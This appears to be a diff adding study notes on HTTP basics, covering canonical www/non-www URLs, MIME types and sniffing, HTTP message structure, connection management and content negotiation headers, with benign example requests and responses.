+                    1. A server receives a request for http://www.example.org/whaddup (when the canonical domain is example.org)
+
+                    2. The server answers with a code 301 with the header Location: http://example.org/whaddup.
+
+                    3. The client issues a request to the canonical domain: http://example.org/whatddup
+
+                The HTML5 boilerplate project has an example on how to configure an Apache server to redirect one domain to the other.
+
+            Using <link rel="canonical">:
+                It is possible to add a special HTML <link> element to a page to indicate what the canonical address of a page is. This has no impact on the human reader of the page, but tells search engine crawlers where the page actually lives. This way, search engines don't index the same page several times, potentially leading to it being considered as duplicate content or spam, and even removing or lowering your page from the search engine result pages.
+
+                When adding such a tag, you serve the same content for both domains, telling search engines which URL is canonical. In the previous example, http://www.example.org/whaddup would serve the same content as http://example.org/whaddup, but with an additional <link> element in the head:
+
+                <link href="http://example.org/whaddup" rel="canonical">
+
+                Unlike the previous case, browser history will consider non-www and www URLs as independent entries.
+
+    MIME types (IANA media types):
+        A media type (also known as a Multipurpose Internet Mail Extensions or MIME type) is a standard that indicates the nature and format of a document, file, or assortment of bytes. It is defined and standardized in IETF's RFC 6838.
+
+        The Internet Assigned Numbers Authority (IANA) is responsible for all official MIME types, and you can find the most up-to-date and complete list at their Media Types page.
+
+        Important: Browsers use the MIME type, not the file extension, to determine how to process a URL, so it's important that web servers send the correct MIME type in the response's Content-Type header. If this is not correctly configured, browsers are likely to misinterpret the contents of files and sites will not work correctly, and downloaded files may be mishandled.
+
+        Structure of a MIME type:
+            The simplest MIME type consists of a type and a subtype; these are each strings which, when concatenated with a slash (/) between them, comprise a MIME type. No whitespace is allowed in a MIME type:
+                type/subtype
+
+            The type represents the general category into which the data type falls, such as video or text. The subtype identifies the exact kind of data of the specified type the MIME type represents. For example, for the MIME type text, the subtype might be plain (plain text), html (HTML source code), or calendar (for iCalendar/.ics) files.
+
+            Each type has its own set of possible subtypes, and a MIME type always has both a type and a subtype, never just one or the other.
+
+            An optional parameter can be added to provide additional details:
+                type/subtype;parameter=value
+
+            For example, for any MIME type whose main type is text, the optional charset parameter can be used to specify the character set used for the characters in the data. If no charset is specified, the default is ASCII (US-ASCII) unless overridden by the user agent's settings. To specify a UTF-8 text file, the MIME type text/plain;charset=UTF-8 is used.
+
+            MIME types are case-insensitive but are traditionally written in lowercase, with the exception of parameter values, whose case may or may not have specific meaning.
+
+            Types:
+                There are two classes of type: discrete and multipart. Discrete types are types which represent a single file or medium, such as a single text or music file, or a single video. A multipart type is one which represents a document that's comprised of multiple component parts, each of which may have its own individual MIME type; or, a multipart type may encapsulate multiple files being sent together in one transaction. For example, multipart MIME types are used when attaching multiple files to an email.
+
+                Discrete types:
+                    application:
+                        Any kind of binary data that doesn't fall explicitly into one of the other types; either data that will be executed or interpreted in some way or binary data that requires a specific application or category of application to use. Generic binary data (or binary data whose true type is unknown) is application/octet-stream. Other common examples include application/pdf, application/pkcs8, and application/zip.
+
+                    audio:
+                        Audio or music data. Examples include audio/mpeg, audio/vorbis.
+
+                    example:
+                        Reserved for use as a placeholder in examples showing how to use MIME types. These should never be used outside of sample code listings and documentation. example can also be used as a subtype; for instance, in an example related to working with audio on the web, the MIME type audio/example can be used to indicate that the type is a placeholder and should be replaced with an appropriate one when using the code in the real world.
+
+                    font:
+                        Font/typeface data. Common examples include font/woff, font/ttf, and font/otf.
+
+                    image:
+                        Image or graphical data including both bitmap and vector still images as well as animated versions of still image formats such as animated GIF or APNG. Common examples are image/jpeg, image/png, and image/svg+xml.
+
+                    model:
+                        Model data for a 3D object or scene. Examples include model/3mf and model/vml.
+
+                    text:
+                        Text-only data including any human-readable content, source code, or textual data such as comma-separated value (CSV) formatted data. Examples include text/plain, text/csv, and text/html.
+
+                    video:
+                        Video data or files, such as MP4 movies (video/mp4).
+
+                    For text documents without a specific subtype, text/plain should be used. Similarly, for binary documents without a specific or known subtype, application/octet-stream should be used.
+
+                Multipart types:
+                    Multipart types indicate a category of document broken into pieces, often with different MIME types; they can also be used — especially in email scenarios — to represent multiple, separate files which are all part of the same transaction. They represent a composite document.
+
+                    With the exception of multipart/form-data, used in the POST method of HTML Forms, and multipart/byteranges, used with 206 Partial Content to send part of a document, HTTP doesn't handle multipart documents in a special way: the message is transmitted to the browser (which will likely show a "Save As" window if it doesn't know how to display the document).
+
+                    There are two multipart types:
+                        message:
+                            A message that encapsulates other messages. This can be used, for instance, to represent an email that includes a forwarded message as part of its data, or to allow sending very large messages in chunks as if it were multiple messages. Examples include message/rfc822 (for forwarded or replied-to message quoting) and message/partial to allow breaking a large message into smaller ones automatically to be reassembled by the recipient.
+
+                        multipart:
+                            Data that is comprised of multiple components which may individually have different MIME types. Examples include multipart/form-data (for data produced using the FormData API) and multipart/byteranges (defined in RFC 7233: 5.4.1 and used with HTTP's 206 "Partial Content" response returned when the fetched data is only part of the content, such as is delivered using the Range header).
+
+        Important MIME types for Web developers:
+            application/octet-stream:
+                This is the default for binary files. As it means unknown binary file, browsers usually don't execute it, or even ask if it should be executed. They treat it as if the Content-Disposition header was set to attachment, and propose a "Save As" dialog.
+
+            text/plain:
+                This is the default for textual files. Even if it really means "unknown textual file," browsers assume they can display it.
+
+            text/css:
+                CSS files used to style a Web page must be sent with text/css. If a server doesn't recognize the .css suffix for CSS files, it may send them with text/plain or application/octet-stream MIME types. If so, they won't be recognized as CSS by most browsers and will be ignored.
+
+            text/html:
+                All HTML content should be served with this type. Alternative MIME types for XHTML (like application/xhtml+xml) are mostly useless nowadays.
+
+                Note: Use application/xml or application/xhtml+xml if you want XML’s strict parsing rules, <![CDATA[…]]> sections, or elements that aren't from HTML/SVG/MathML namespaces.
+
+            text/javascript:
+                Per the HTML specification, JavaScript files should always be served using the MIME type text/javascript. No other values are considered valid, and using any of those may result in scripts that do not load or run.
+
+            Image types:
+                image/subtype
+
+            Audio and video types:
+                As is the case for images, HTML doesn't mandate that web browsers support any specific file and codec types for the <audio> and <video> elements, so it's important to consider your target audience and the range of browsers (and versions of those browsers) they may be using when choosing the file type and codecs to use for media.
+
+            multipart/form-data:
+                The multipart/form-data type can be used when sending the values of a completed HTML Form from browser to server.
+
+                As a multipart document format, it consists of different parts, delimited by a boundary (a string starting with a double dash --). Each part is its own entity with its own HTTP headers, Content-Disposition, and Content-Type for file uploading fields.
+
+                    Content-Type: multipart/form-data; boundary=aBoundaryString
+                    (other headers associated with the multipart document as a whole)
+
+                    --aBoundaryString
+                    Content-Disposition: form-data; name="myFile"; filename="img.jpg"
+                    Content-Type: image/jpeg
+
+                    (data)
+                    --aBoundaryString
+                    Content-Disposition: form-data; name="myField"
+
+                    (data)
+                    --aBoundaryString
+                    (more subparts)
+                    --aBoundaryString--
+
+                The following <form>:
+                    <form action="http://localhost:8000/" method="post" enctype="multipart/form-data">
+                      <label>Name: <input name="myTextField" value="Test"></label>
+                      <label><input type="checkbox" name="myCheckBox"> Check</label>
+                      <label>Upload file: <input type="file" name="myFile" value="test.txt"></label>
+                      <button>Send the file</button>
+                    </form>
+
+                will send this message:
+                    POST / HTTP/1.1
+                    Host: localhost:8000
+                    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                    Accept-Language: en-US,en;q=0.5
+                    Accept-Encoding: gzip, deflate
+                    Connection: keep-alive
+                    Upgrade-Insecure-Requests: 1
+                    Content-Type: multipart/form-data; boundary=---------------------------8721656041911415653955004498
+                    Content-Length: 465
+
+                    -----------------------------8721656041911415653955004498
+                    Content-Disposition: form-data; name="myTextField"
+
+                    Test
+                    -----------------------------8721656041911415653955004498
+                    Content-Disposition: form-data; name="myCheckBox"
+
+                    on
+                    -----------------------------8721656041911415653955004498
+                    Content-Disposition: form-data; name="myFile"; filename="test.txt"
+                    Content-Type: text/plain
+
+                    Simple file.
+                    -----------------------------8721656041911415653955004498-
+
+            multipart/byteranges:
+                The multipart/byteranges MIME type is used to send partial responses to the browser.
+
+                When the 206 Partial Content status code is sent, this MIME type indicates that the document is composed of several parts, one for each of the requested ranges. Like other multipart types, the Content-Type uses a boundary to separate the pieces. Each piece has a Content-Type header with its actual type and a Content-Range of the range it represents.
+                    HTTP/1.1 206 Partial Content
+                    Accept-Ranges: bytes
+                    Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5
+                    Content-Length: 385
+
+                    --3d6b6a416f9b5
+                    Content-Type: text/html
+                    Content-Range: bytes 100-200/1270
+
+                    eta http-equiv="Content-type" content="text/html; charset=utf-8" />
+                        <meta name="vieport" content
+                    --3d6b6a416f9b5
+                    Content-Type: text/html
+                    Content-Range: bytes 300-400/1270
+
+                    -color: #f0f0f2;
+                            margin: 0;
+                            padding: 0;
+                            font-family: "Open Sans", "Helvetica
+                    --3d6b6a416f9b5--
+
+        Importance of setting the correct MIME type:
+            Most web servers send unrecognized resources as the application/octet-stream MIME type. For security reasons, most browsers do not allow setting a custom default action for such resources, forcing the user to save it to disk to use it.
+
+            Some common incorrect server configurations:
+                - RAR-compressed files. In this case, the ideal would be the true type of the original files; this is often impossible as .RAR files can hold several resources of different types. In this case, configure the server to send application/x-rar-compressed.
+
+                - Audio and video. Only resources with the correct MIME Type will be played in <video> or <audio> elements. Be sure to specify the correct media type for audio and video.
+
+                - Proprietary file types. Avoid using application/octet-stream as most browsers do not allow defining a default behavior (like "Open in Word") for this generic MIME type. A specific type like application/vnd.mspowerpoint lets users open such files automatically in the presentation software of their choice.
+
+        MIME sniffing:
+            In the absence of a MIME type, or in certain cases where browsers believe they are incorrect, browsers may perform MIME sniffing — guessing the correct MIME type by looking at the bytes of the resource.
+
+            Each browser performs MIME sniffing differently and under different circumstances. (For example, Safari will look at the file extension in the URL if the sent MIME type is unsuitable.) There are security concerns as some MIME types represent executable content. Servers can prevent MIME sniffing by sending the X-Content-Type-Options header.
+
+        Other methods of conveying document type:
+            MIME types are not the only way to convey document type information:
+                - Filename suffixes are sometimes used, especially on Microsoft Windows. Not all operating systems consider these suffixes meaningful (such as Linux and MacOS), and there is no guarantee they are correct.
+
+                - Magic numbers. The syntax of different formats allows file-type inference by looking at their byte structure. For example, GIF files start with the 47 49 46 38 39 hexadecimal value (GIF89), and PNG files with 89 50 4E 47 (.PNG). Not all file types have magic numbers, so this is not 100% reliable either.
+
+    Incomplete list of MIME types:
+        https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Complete_list_of_MIME_types
+
+    HTTP Messages:
+        HTTP messages are how data is exchanged between a server and a client. There are two types of messages: requests sent by the client to trigger an action on the server, and responses, the answer from the server.
+
+        HTTP messages are composed of textual information encoded in ASCII, and span over multiple lines. In HTTP/1.1, and earlier versions of the protocol, these messages were openly sent across the connection. In HTTP/2, the once human-readable message is now divided up into HTTP frames, providing optimization and performance improvements.
+
+        Web developers, or webmasters, rarely craft these textual HTTP messages themselves: software, a Web browser, proxy, or Web server, perform this action. They provide HTTP messages through config files (for proxies or servers), APIs (for browsers), or other interfaces.
+
+        The HTTP/2 binary framing mechanism has been designed to not require any alteration of the APIs or config files applied: it is broadly transparent to the user.
+
+        HTTP requests, and responses, share similar structure and are composed of:
+            1. A start-line describing the requests to be implemented, or its status of whether successful or a failure. This start-line is always a single line.
+
+            2. An optional set of HTTP headers specifying the request, or describing the body included in the message.
+
+            3. A blank line indicating all meta-information for the request have been sent.
+
+            4. An optional body containing data associated with the request (like content of an HTML form), or the document associated with a response. The presence of the body and its size is specified by the start-line and HTTP headers.
+
+        The start-line and HTTP headers of the HTTP message are collectively known as the head of the requests, whereas its payload is known as the body.
+
+        HTTP Requests:
+            Start line:
+                HTTP requests are messages sent by the client to initiate an action on the server. Their start-line contain three elements:
+                    1. An HTTP method, a verb (like GET, PUT or POST) or a noun (like HEAD or OPTIONS), that describes the action to be performed. For example, GET indicates that a resource should be fetched or POST means that data is pushed to the server (creating or modifying a resource, or generating a temporary document to send back).
+
+                    2. The request target, usually a URL, or the absolute path of the protocol, port, and domain are usually characterized by the request context. The format of this request target varies between different HTTP methods. It can be
+                        - An absolute path, ultimately followed by a '?' and query string. This is the most common form, known as the origin form, and is used with GET, POST, HEAD, and OPTIONS methods.
+                            POST / HTTP/1.1
+                            GET /background.png HTTP/1.0
+                            HEAD /test.html?query=alibaba HTTP/1.1
+                            OPTIONS /anypage.html HTTP/1.0
+
+                        - A complete URL, known as the absolute form, is mostly used with GET when connected to a proxy.
+                            GET http://developer.mozilla.org/en-US/docs/Web/HTTP/Messages HTTP/1.1
+
+                        - The authority component of a URL, consisting of the domain name and optionally the port (prefixed by a ':'), is called the authority form. It is only used with CONNECT when setting up an HTTP tunnel.
+                            CONNECT developer.mozilla.org:80 HTTP/1.1
+
+                        - The asterisk form, a simple asterisk ('*') is used with OPTIONS, representing the server as a whole.
+                            OPTIONS * HTTP/1.1
+
+                    3. The HTTP version, which defines the structure of the remaining message, acting as an indicator of the expected version to use for the response.
+
+            Headers:
+                HTTP headers from a request follow the same basic structure of an HTTP header: a case-insensitive string followed by a colon (':') and a value whose structure depends upon the header. The whole header, including the value, consist of one single line, which can be quite long.
+
+                There are numerous request headers available. They can be divided in several groups:
+                    - General headers, like Via, apply to the message as a whole.
+
+                    - Request headers, like User-Agent, Accept-Type, modify the request by specifying it further (like Accept-Language), by giving context (like Referer), or by conditionally restricting it (like If-None).
+
+                    - Entity headers, like Content-Length which apply to the body of the request. Obviously, there is no such header transmitted if there is no body in the request.
+
+            Body:
+                The final part of the request is its body. Not all requests have one: requests fetching resources, like GET, HEAD, DELETE, or OPTIONS, usually don't need one. Some requests send data to the server in order to update it: as often the case with POST requests (containing HTML form data).
+
+                Bodies can be broadly divided into two categories:
+                    - Single-resource bodies, consisting of one single file, defined by the two headers: Content-Type and Content-Length.
+
+                    - Multiple-resource bodies, consisting of a multipart body, each containing a different bit of information. This is typically associated with HTML Forms.
+
+        HTTP Responses:
+            Status line:
+                The start line of an HTTP response, called the status line, contains the following information:
+                    1. The protocol version, usually HTTP/1.1.
+
+                    2. A status code, indicating success or failure of the request. Common status codes are 200, 404, or 302
+
+                    3. A status text. A brief, purely informational, textual description of the status code to help a human understand the HTTP message.
+
+                A typical status line looks like: HTTP/1.1 404 Not Found.
+
+            Headers:
+                HTTP headers for responses follow the same structure as any other header: a case-insensitive string followed by a colon (':') and a value whose structure depends upon the type of the header. The whole header, including its value, presents as a single line.
+
+                There are numerous response headers available. These can be divided into several groups:
+                    - General headers, like Via, apply to the whole message.
+
+                    - Response headers, like Vary and Accept-Ranges, give additional information about the server which doesn't fit in the status line.
+
+                    - Entity headers, like Content-Length, apply to the body of the response. Typically, no such headers are transmitted when there is no body in the response.
+
+            Body:
+                The last part of a response is the body. Not all responses have one: responses with a status code, like 201 or 204, usually don't.
+
+                Bodies can be broadly divided into three categories:
+                    - Single-resource bodies, consisting of a single file of known length, defined by the two headers: Content-Type and Content-Length.
+
+                    - Single-resource bodies, consisting of a single file of unknown length, encoded by chunks with Transfer-Encoding set to chunked.
+
+                    - Multiple-resource bodies, consisting of a multipart body, each containing a different section of information. These are relatively rare.
+
+        HTTP/2 Frames:
+            HTTP/1.x messages have a few drawbacks for performance:
+                - Headers, unlike bodies, are uncompressed.
+
+                - Headers are often very similar from one message to the next one, yet still repeated across connections.
+
+                - No multiplexing can be done. Several connections need opening on the same server: and warm TCP connections are more efficient than cold ones.
+
+            HTTP/2 introduces an extra step: it divides HTTP/1.x messages into frames which are embedded in a stream. Data and header frames are separated, this allows header compression. Several streams can be combined together, a process called multiplexing, allowing more efficient underlying TCP connections.
+
+            HTTP frames are now transparent to Web developers. This is an additional step in HTTP/2, between HTTP/1.1 messages and the underlying transport protocol. No changes are needed in the APIs used by Web developers to utilize HTTP frames; when available in both the browser and the server, HTTP/2 is switched on and used.
+
+        Conclusion:
+            HTTP messages are the key in using HTTP; their structure is simple, and they are highly extensible. The HTTP/2 framing mechanism adds a new intermediate layer between the HTTP/1.x syntax and the underlying transport protocol, without fundamentally modifying it: building upon proven mechanisms.
+
+    Connection management in HTTP/1.x:
+        Connection management is a key topic in HTTP: opening and maintaining connections largely impacts the performance of Web sites and Web applications. In HTTP/1.x, there are several models: short-lived connections, persistent connections, and HTTP pipelining.
+
+        HTTP mostly relies on TCP for its transport protocol, providing a connection between the client and the server. In its infancy, HTTP used a single model to handle such connections. These connections were short-lived: a new one created each time a request needed sending, and closed once the answer had been received.
+
+        This simple model held an innate limitation on performance: opening each TCP connection is a resource-consuming operation. Several messages must be exchanged between the client and the server. Network latency and bandwidth affect performance when a request needs sending. Modern Web pages require many requests (a dozen or more) to serve the amount of information needed, proving this earlier model inefficient.
+
+        Two newer models were created in HTTP/1.1. The persistent-connection model keeps connections opened between successive requests, reducing the time needed to open new connections. The HTTP pipelining model goes one step further, by sending several successive requests without even waiting for an answer, reducing much of the latency in the network.
+
+        HTTP/2 adds additional models for connection management.
+
+        It's important point to note that connection management in HTTP applies to the connection between two consecutive nodes, which is hop-by-hop and not end-to-end. The model used in connections between a client and its first proxy may differ from the model between a proxy and the destination server (or any intermediate proxies). The HTTP headers involved in defining the connection model, like Connection and Keep-Alive, are hop-by-hop headers with their values able to be changed by intermediary nodes.
+
+        A related topic is the concept of HTTP connection upgrades, wherein an HTTP/1.1 connection is upgraded to a different protocol, such as TLS/1.0, WebSocket, or even HTTP/2 in cleartext. This protocol upgrade mechanism is documented in more detail elsewhere.
+
+        Short-lived connections:
+            The original model of HTTP, and the default one in HTTP/1.0, is short-lived connections. Each HTTP request is completed on its own connection; this means a TCP handshake happens before each HTTP request, and these are serialized.
+
+            The TCP handshake itself is time-consuming, but a TCP connection adapts to its load, becoming more efficient with more sustained (or warm) connections. Short-lived connections do not make use of this efficiency feature of TCP, and performance degrades from optimum by persisting to transmit over a new, cold connection.
+
+            This model is the default model used in HTTP/1.0 (if there is no Connection header, or if its value is set to close). In HTTP/1.1, this model is only used when the Connection header is sent with a value of close.
+
+            Unless dealing with a very old system, which doesn't support a persistent connection, there is no compelling reason to use this model.
+
+        Persistent connections:
+            Short-lived connections have two major hitches: the time taken to establish a new connection is significant, and performance of the underlying TCP connection gets better only when this connection has been in use for some time (warm connection). To ease these problems, the concept of a persistent connection has been designed, even prior to HTTP/1.1. Alternatively this may be called a keep-alive connection.
+
+            A persistent connection is one which remains open for a period of time, and can be reused for several requests, saving the need for a new TCP handshake, and utilizing TCP's performance enhancing capabilities. This connection will not stay open forever: idle connections are closed after some time (a server may use the Keep-Alive header to specify a minimum time the connection should be kept open).
+
+            Persistent connections also have drawbacks; even when idling they consume server resources, and under heavy load, DoS attacks can be conducted. In such cases, using non-persistent connections, which are closed as soon as they are idle, can provide better performance.
+
+            HTTP/1.0 connections are not persistent by default. Setting Connection to anything other than close, usually retry-after, will make them persistent.
+
+            In HTTP/1.1, persistence is the default, and the header is no longer needed (but it is often added as a defensive measure against cases requiring a fallback to HTTP/1.0).
+
+        HTTP pipelining:
+            HTTP pipelining is not activated by default in modern browsers:
+                - Buggy proxies are still common and these lead to strange and erratic behaviors that Web developers cannot foresee and diagnose easily.
+
+                - Pipelining is complex to implement correctly: the size of the resource being transferred, the effective RTT that will be used, as well as the effective bandwidth, have a direct incidence on the improvement provided by the pipeline. Without knowing these, important messages may be delayed behind unimportant ones. The notion of important even evolves during page layout! HTTP pipelining therefore brings a marginal improvement in most cases only.
+
+                - Pipelining is subject to the HOL problem.
+
+            For these reasons, pipelining has been superseded by a better algorithm, multiplexing, that is used by HTTP/2.
+
+            By default, HTTP requests are issued sequentially. The next request is only issued once the response to the current request has been received. As they are affected by network latencies and bandwidth limitations, this can result in significant delay before the next request is seen by the server.
+
+            Pipelining is the process to send successive requests, over the same persistent connection, without waiting for the answer. This avoids latency of the connection. Theoretically, performance could also be improved if two HTTP requests were to be packed into the same TCP message. The typical MSS (Maximum Segment Size), is big enough to contain several simple requests, although the demand in size of HTTP requests continues to grow.
+
+            Not all types of HTTP requests can be pipelined: only idempotent methods, that is GET, HEAD, PUT and DELETE, can be replayed safely: should a failure happen, the pipeline content can simply be repeated.
+
+            Today, every HTTP/1.1-compliant proxy and server should support pipelining, though many have limitations in practice: a significant reason no modern browser activates this feature by default.
+
+        Domain sharding:
+            Unless you have a very specific immediate need, don't use this deprecated technique; switch to HTTP/2 instead. In HTTP/2, domain sharding is no longer useful: the HTTP/2 connection is able to handle parallel unprioritized requests very well. Domain sharding is even detrimental to performance. Most HTTP/2 implementations use a technique called connection coalescing to revert eventual domain sharding.
+
+            As an HTTP/1.x connection is serializing requests, even without any ordering, it can't be optimal without large enough available bandwidth. As a solution, browsers open several connections to each domain, sending parallel requests. Default was once 2 to 3 connections, but this has now increased to a more common use of 6 parallel connections. There is a risk of triggering DoS protection on the server side if attempting more than this number.
+
+            If the server wishes a faster Web site or application response, it is possible for the server to force the opening of more connections. For example, Instead of having all resources on the same domain, say www.example.com, it could split over several domains, www1.example.com, www2.example.com, www3.example.com. Each of these domains resolve to the same server, and the Web browser will open 6 connections to each (in our example, boosting the connections to 18). This technique is called domain sharding.
+
+        Conclusion:
+            Improved connection management allows considerable boosting of performance in HTTP. With HTTP/1.1 or HTTP/1.0, using a persistent connection – at least until it becomes idle – leads to the best performance. However, the failure of pipelining has lead to designing superior connection management models, which have been incorporated into HTTP/2.
+
+    Content negotiation:
+        In HTTP, content negotiation is the mechanism that is used for serving different representations of a resource at the same URI, so that the user agent can specify which is best suited for the user (for example, which language of a document, which image format, or which content encoding).
+
+        Principles of content negotiation:
+            A specific document is called a resource. When a client wants to obtain it, it requests it using its URL. The server uses this URL to choose one of the variants it provides – each variant being called a representation – and returns this specific representation to the client. The overall resource, as well as each of the representations, have a specific URL. How a specific representation is chosen when the resource is called is determined by content negotiation and there are several ways of negotiating between the client and the server.
+
+            The determination of the best suited representation is made through one of two mechanisms:
+                Specific HTTP headers by the client (server-driven negotiation or proactive negotiation), which is the standard way of negotiating a specific kind of resource.
+                The 300 (Multiple Choices) or 406 (Not Acceptable) HTTP response codes by the server (agent-driven negotiation or reactive negotiation), that are used as fallback mechanisms.
+
+            Over the years, other content negotiation proposals, like transparent content negotiation and the Alternates header, have been proposed. They failed to get traction and got abandoned.
+
+        Server-driven content negotiation:
+            In server-driven content negotiation, or proactive content negotiation, the browser (or any other kind of user-agent) sends several HTTP headers along with the URL. These headers describe the preferred choice of the user. The server uses them as hints and an internal algorithm chooses the best content to serve to the client. The algorithm is server-specific and not defined in the standard. See, for example, the Apache negotiation algorithm.
+
+            The HTTP/1.1 standard defines list of the standard headers that start server-driven negotiation (Accept, Accept-Charset, Accept-Encoding, Accept-Language). Though strictly speaking User-Agent is not in this list, it is sometimes also used to send a specific representation of the requested resource, though this is not considered as a good practice. The server uses the Vary header to indicate which headers it actually used for content negotiation (or more precisely the associated response headers), so that caches can work optimally.
+
+            In addition to these, there is an experimental proposal to add more headers to the list of available headers, called client hints. Client hints advertise what kind of device the user agent runs on (for example,  if it is a desktop computer or a mobile device).
+
+            Even if server-driven content negotiation is the most common way to agree on a specific representation of a resource, it has several drawbacks:
+                - The server doesn't have total knowledge of the browser. Even with the Client Hints extension, it has not a complete knowledge of the capabilities of the browser. Unlike reactive content negotiation where the client makes the choice, the server choice is always somewhat arbitrary.
+
+                - The information by the client is quite verbose (HTTP/2 header compression mitigates this problem) and a privacy risk (HTTP fingerprinting)
+
+                - As several representations of a given resource are sent, shared caches are less efficient and server implementations are more complex.
+
+            The Accept header:
+                The Accept header lists the MIME types of media resources that the agent is willing to process. It is comma-separated lists of MIME types, each combined with a quality factor, a parameter indicating the relative degree of preference between the different MIME types.
+
+                The Accept header is defined by the browser, or any other user-agent, and can vary according to the context, like fetching an HTML page or an image, a video, or a script: It is different when fetching a document entered in the address bar or an element linked via an <img>, <video> or <audio> element. Browsers are free to use the value of the header that they think is the most adequate; an exhaustive list of default values for common browsers is available.
+
+            The Accept-CH header:
+                This is part of an experimental technology called Client Hints. Initial support is in Chrome 46 or later. The Device-Memory value is in Chrome 61 or later.
+
+                The experimental Accept-CH lists configuration data that can be used by the server to select an appropriate response. Valid values are:
+                    Device-Memory:
+                        Indicates the approximate amount of device RAM. This value is an approximation given by rounding to the nearest power of 2 and dividing that number by 1024. For example, 512 megabytes will be reported as 0.5.
+
+                    DPR:
+                        Indicates the client's device pixel ratio.
+
+                    Viewport-Width:
+                        Indicates the layout viewport width in CSS pixels.
+
+                    Width:
+                        Indicates the resource width in physical pixels (in other words the intrinsic size of an image).
+
+            The Accept-Charset header:
+                The Accept-Charset header indicates to the server what kinds of character encodings are understood by the user-agent. Traditionally, it was set to a different value for each locale for the browser, like ISO-8859-1,utf-8;q=0.7,*;q=0.7 for a Western European locale.
+
+                With UTF-8 now being well-supported, being the preferred way of encoding characters, and to guarantee better privacy through less configuration-based entropy, browsers omit the Accept-Charset header: Internet Explorer 8, Safari 5, Opera 11, Firefox 10 and Chrome 27 have abandoned this header.
+
+            The Accept-CH-Lifetime header:
+                This is part of an experimental technology called Client Hints  and is only available in Chrome 61 or later.
+
+                The Accept-CH-Lifetime header is used with the Device-Memory value of the Accept-CH header and indicates the amount of time the device should opt-in to sharing the amount of device memory with the server. The value is given in miliseconds and it's use is optional.
+
+            The Accept-Encoding header:
+                The Accept-Encoding header defines the acceptable content-encoding (supported compressions). The value is a q-factor list (e.g.: br, gzip;q=0.8) that indicates the priority of the encoding values. The default value identity is at the lowest priority (unless otherwise declared).
+
+                Compressing HTTP messages is one of the most important ways to improve the performance of a Web site, it shrinks the size of the data transmitted and makes better use of the available bandwidth; browsers always send this header and the server should be configured to abide to it and to use compression.
+
+            The Accept-Language header:
+                The Accept-Language header is used to indicate the language preference of the user. It is a list of values with quality factors (like: "de, en;q=0.7"). A default value is often set according the language of the graphical interface of the user agent, but most browsers allow to set different language preferences.
+
+                Due to the configuration-based entropy increase, a modified value can be used to fingerprint the user, it is not recommended to change it and a Web site cannot trust this value to reflect the actual wish of the user. Site designers must not be over-zealous by using language detection via this header as it can lead to a poor user experience:
+                    - They should always provide a way to overcome the server-chosen language, e.g., by providing a language menu on the site. Most user-agents provide a default value for the Accept-Language header, adapted to the user interface language and end users often do not modify it, either by not knowing how, or by not being able to do it, as in an Internet café for instance.
+
+                    - Once a user has overridden the server-chosen language, a site should no longer use language detection and should stick with the explicitly-chosen language. In other words, only entry pages of a site should select the proper language using this header.
+
+            The User-Agent header:
+                Though there are legitimate uses of this header for selecting content, it is considered bad practice to rely on it to define what features are supported by the user agent.
+
+                The User-Agent header identifies the browser sending the request. This string may contain a space-separated list of product tokens and comments.
+
+                A product token is a name followed by a '/' and a version number, like Firefox/4.0.1. There may be as many of them as the user-agent wants. A comment is a free string delimited by parentheses. Obviously parentheses cannot be used in that string. The inner format of a comment is not defined by the standard, though several browser put several tokens in it, separated by ';'.
+
+            The Vary response header:
+                In opposition to the previous Accept-* headers which are sent by the client, the Vary HTTP header is sent by the web server in its response. It indicates the list of headers used by the server during the server-driven content negotiation phase. The header is needed in order to inform the cache of the decision criteria so that it can reproduce it, allowing the cache to be functional while preventing serving erroneous content to the user.
+
+                The special value of '*' means that the server-driven content negotiation also uses information not conveyed in a header to choose the appropriate content.
+
+                The Vary header was added in the version 1.1 of HTTP and is necessary in order to allow caches to work appropriately. A cache, in order to work with server-driven content negotiation, needs to know which criteria was used by the server to select the transmitted content. That way, the cache can replay the algorithm and will be able to serve acceptable content directly, without more request to the server. Obviously, the wildcard '*' prevents caching from occurring, as the cache cannot know what element is behind it.
+
+        Agent-driven negotiation:
+            Server-driven negotiation suffers from a few downsides: it doesn't scale well. There is one header per feature used in the negotiation. If you want to use screen size, resolution or other dimensions, a new HTTP header must be created. Sending of the headers must be done on every request. This is not too problematic with few headers, but with the eventual multiplications of them, the message size would lead to a decrease in performance. The more precise headers are sent, the more entropy is sent, allowing for more HTTP fingerprinting and corresponding privacy concern.
+
+            From the beginnings of HTTP, the protocol allowed another negotiation type: agent-driven negotiation or reactive negotiation. In this negotiation, when facing an ambiguous request, the server sends back a page containing links to the available alternative resources. The user is presented the resources and choose the one to use.
+
+A typical HTTP session:
+    In client-server protocols, like HTTP, sessions consist of three phases:
+        1. The client establishes a TCP connection (or the appropriate connection if the transport layer is not TCP).
+
+        2. The client sends its request, and waits for the answer.
+
+        3. The server processes the request, sending back its answer, providing a status code and appropriate data.
+
+    As of HTTP/1.1, the connection is no longer closed after completing the third phase, and the client is now granted a further request: this means the second and third phases can now be performed any number of times.
+
+    Establishing a connection:
+        In client-server protocols, it is the client which establishes the connection. Opening a connection in HTTP means initiating a connection in the underlying transport layer, usually this is TCP.
+
+        With TCP the default port, for an HTTP server on a computer, is port 80. Other ports can also be used, like 8000 or 8080. The URL of a page to fetch contains both the domain name, and the port number, though the latter can be omitted if it is 80. See Identifying resources on the Web for more details.
+
+        Note: The client-server model does not allow the server to send data to the client without an explicit request for it. To work around this problem, web developers use several techniques: ping the server periodically via the XMLHTTPRequest, Fetch APIs, using the WebSockets API, or similar protocols.
+
+    Sending a client request:
+        Once the connection is established, the user-agent can send the request (a user-agent is typically a web browser, but can be anything else, a crawler, for example). A client request consists of text directives, separated by CRLF (carriage return, followed by line feed), divided into three blocks:
+            . The first line contains a request method followed by its parameters:
+                - the path of the document, i.e. an absolute URL without the protocol or domain name
+                - the HTTP protocol version
+
+            . Subsequent lines represent an HTTP header, giving the server information about what type of data is appropriate (e.g., what language, what MIME types), or other data altering its behavior (e.g., not sending an answer if it is already cached). These HTTP headers form a block which ends with an empty line.
+
+            . The final block is an optional data block, which may contain further data mainly used by the POST method.
+
+        Example requests:
+            Fetching the root page of developer.mozilla.org, i.e. http://developer.mozilla.org/, and telling the server that the user-agent would prefer the page in French, if possible:
+                GET / HTTP/1.1
+                Host: developer.mozilla.org
+                Accept-Language: fr
+
